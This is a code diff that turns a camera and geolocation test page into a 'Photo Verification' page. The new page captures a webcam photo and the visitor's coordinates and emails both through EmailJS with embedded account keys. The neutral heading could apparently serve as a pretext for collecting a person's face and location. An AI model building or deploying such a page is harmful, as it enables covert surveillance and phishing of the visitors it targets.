@@ -1,18 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera + Location Capture</title>
+  <title>Camera + Location Sender</title>
+
+  <!-- EmailJS Script -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <script>
+    // Initialize EmailJS with your Public Key
+    (function() {
+      emailjs.init("vieRRG0Q8QGFFS-XO");
+    })();
+  </script>
+
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    video { margin-top: 10px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; margin: 10px 5px; font-size: 16px; }
+  </style>
 </head>
 <body>
-  <h2>Camera + Geolocation Test</h2>
 
-  <button onclick="startCamera()">Open Camera</button>
-  <button onclick="takePhoto()">Take Photo</button>
+<h2>Photo Verification</h2>
 
-  <p id="status"></p>
+<button onclick="startCamera()">Open Camera</button>
+<button onclick="takePhoto()">Take Photo</button>
 
-  <video id="video" width="320" height="240" autoplay></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<p id="status"></p>
+
+<video id="video" width="320" height="240" autoplay></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
 let stream;
@@ -22,52 +39,47 @@ async function startCamera() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: true });
     document.getElementById("video").srcObject = stream;
-    document.getElementById("status").innerText = "Camera opened!";
+    document.getElementById("status").innerText = "Camera started!";
   } catch (err) {
     document.getElementById("status").innerText = "Camera permission denied.";
   }
 }
 
-// Take photo (user must click)
+// Take photo & send with location
 function takePhoto() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
   const context = canvas.getContext("2d");
+
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
   const image = canvas.toDataURL("image/png");
 
-  document.getElementById("status").innerText = "Photo captured!";
+  document.getElementById("status").innerText = "Photo taken. Getting location...";
 
-  // After photo, get location
+  // Get location
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+    navigator.geolocation.getCurrentPosition((pos) => {
 
-        // Upload photo + location
-        fetch("YOUR_SERVER_URL_HERE", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            image: image,
-            latitude: lat,
-            longitude: lon
-          })
-        })
-        .then(() => {
-          document.getElementById("status").innerText = "Photo + location sent!";
-        })
-        .catch(() => {
-          document.getElementById("status").innerText = "Failed to upload.";
-        });
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const locationString = lat + ", " + lon;
 
-      },
-      () => {
-        document.getElementById("status").innerText = "Location denied.";
-      }
-    );
+      // Send email using EmailJS
+      emailjs.send("service_8bf9aat", "template_pee9jcq", {
+        photo: image,
+        location: locationString
+      })
+      .then(() => {
+        document.getElementById("status").innerText = "Photo & location sent to your email!";
+      })
+      .catch((err) => {
+        document.getElementById("status").innerText = "Error sending email.";
+        console.error(err);
+      });
+
+    }, () => {
+      document.getElementById("status").innerText = "Location permission denied.";
+    });
   } else {
     document.getElementById("status").innerText = "Geolocation not supported.";
   }
